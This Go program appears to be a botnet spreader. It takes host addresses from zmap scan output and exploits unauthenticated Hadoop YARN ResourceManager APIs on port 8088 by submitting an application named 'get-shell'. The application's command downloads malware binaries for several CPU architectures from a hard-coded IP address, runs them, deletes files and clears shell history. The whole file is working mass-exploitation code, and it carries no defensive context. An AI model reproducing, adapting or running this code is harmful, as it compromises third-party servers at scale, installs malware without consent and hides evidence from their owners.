import (
    "bufio"
    "encoding/json"
    "fmt"
    "net/http"
    "os"
    "os/exec"
    "strings"
    "sync"
    "time"
)

var (
    cmd = "cd /tmp; wget http://66.29.151.122/bins/djduawa; chmod 777 djduawa; ./djduawa x86_64; wget http://66.29.151.122/bins/jsuwhzd; chmod 777 jsuwhzd; ./jsuwhzd x86; wget http://66.29.151.122/bins/dujejaiw; chmod 777 dujejaiw; ./dujejaiw mips; wget http://66.29.151.122/bins/xuuejxa2; chmod 777 xuuejxa2; ./xuuejxa2 mpsl; rm -rf *; history -c"
    maxConcurrency = 999999 // Adjust this value as needed
    sem            = make(chan struct{}, maxConcurrency)
    waitGroup      sync.WaitGroup
)

type AppSpec struct {
    Commands struct {
        Command string json:"command"
    } json:"commands"
}

type AppData struct {
    ApplicationID   string  json:"application-id"
    ApplicationName string  json:"application-name"
    AmContainerSpec AppSpec json:"am-container-spec"
    ApplicationType string  json:"application-type"
}

func rtek(host string) {
    defer waitGroup.Done()
    sem <- struct{}{} // Acquire a slot
    defer func() { <-sem }() // Release the slot

    url := "http://" + host + ":8088/ws/v1/cluster/apps/new-application"
    client := &http.Client{Timeout: 3 * time.Second}
    resp, err := client.Post(url, "application/json", nil)
    if err != nil {
        return
    }
    defer resp.Body.Close()

    var respData map[string]interface{}
    if err := json.NewDecoder(resp.Body).Decode(&respData); err != nil {
        return
    }

    appID, ok := respData["application-id"].(string)
    if !ok {
        return
    }

    url = "http://" + host + ":8088/ws/v1/cluster/apps"
    data := AppData{
        ApplicationID:   appID,
        ApplicationName: "get-shell",
        ApplicationType: "YARN",
    }
    data.AmContainerSpec.Commands.Command = cmd

    jsonData, err := json.Marshal(data)
    if err != nil {
        return
    }

    resp, err = client.Post(url, "application/json", strings.NewReader(string(jsonData)))
    if err != nil {
        return
    }
    defer resp.Body.Close()

    fmt.Printf("[] - %s\n", host)
}

func main() {
    if len(os.Args) < 2 {
        fmt.Println("Usage: go run main.go <zmap_command>")
        return
    }

    zmapCmd := os.Args[1:]

    cmd := exec.Command(zmapCmd[0], zmapCmd[1:]...)
    stdout, err := cmd.StdoutPipe()
    if err != nil {
        fmt.Println("Error creating StdoutPipe for zmap command:", err)
        return
    }

    if err := cmd.Start(); err != nil {
        fmt.Println("Error starting zmap command:", err)
        return
    }

    scanner := bufio.NewScanner(stdout)
    for scanner.Scan() {
        line := strings.TrimSpace(scanner.Text())
        waitGroup.Add(1)
        go rtek(line)
    }

    if err := scanner.Err(); err != nil {
        fmt.Println("Error reading zmap output:", err)
    }

    waitGroup.Wait()
    fmt.Println("\nDone")
}
